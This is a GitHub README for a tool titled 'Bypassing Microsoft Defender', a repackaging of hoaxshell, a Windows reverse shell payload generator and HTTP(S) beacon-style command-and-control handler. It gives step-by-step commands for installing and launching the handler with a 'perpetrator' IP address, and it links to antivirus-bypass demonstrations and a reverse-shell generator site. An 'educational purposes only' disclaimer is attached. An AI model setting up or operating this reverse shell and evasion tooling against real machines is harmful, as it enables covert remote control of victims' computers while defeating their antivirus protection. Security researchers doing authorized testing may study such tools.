<h1 style="font-size:10vw" align="left">Bypassing Microsoft Defender</h1>

[![Python](https://img.shields.io/badge/Python-%E2%89%A5%203.11-yellow.svg)](https://www.python.org/) 
<img src="https://img.shields.io/badge/PowerShell-%E2%89%A5%20v5.1-blue">
<img src="https://img.shields.io/badge/Developed%20on-kali%20linux%202023.2-blueviolet">
<img src="https://img.shields.io/badge/Maintained%3F-Yes-96c40f">

******
⚠️ *For educational and authorized security research purposes only*


## Original Exploit Authors
Very grateful to the original author [t3l3machus](https://github.com/t3l3machus)


## Description
hoaxshell is a Windows reverse shell payload generator and handler that abuses the http(s) protocol to establish a beacon-like reverse shell, based on the following concept:  

<body align="center">![image](https://user-images.githubusercontent.com/75489922/197529603-1c9238ea-af14-41f7-8834-dd37ad77e809.png)</body>

This c2 concept (which could be implemented by using protocols other than http or pre-installed exes) can be used to establish sessions that promote the illusion of having a shell, but are far from an actual pty.


## Demo
![Animation](https://github.com/asepsaepdin/CVE-2010-1240/assets/122620685/2bbfd368-ecbf-44a2-88dd-a95add3e886c)


## Step Guides
1. First, install all the requirements
```
sudo pip3 install -r requirements.txt
```
2. Make the script executable
```
chmod +x hoaxshell.py
```
3. Execute the script and specify  the **-s 192.168.25.72** with the perpetrator's address
```
./hoaxshell.py -s 192.168.25.72 -r -H "Authorization"
```


## Exploit Requirements
- Python 3.11


## Credits
- https://github.com/t3l3machus/hoaxshell#AV-Bypass-PoCs
- https://www.youtube.com/watch?v=3HddKylkRzM
- https://www.youtube.com/watch?v=fgSARG82TJY
- https://www.revshells.com/
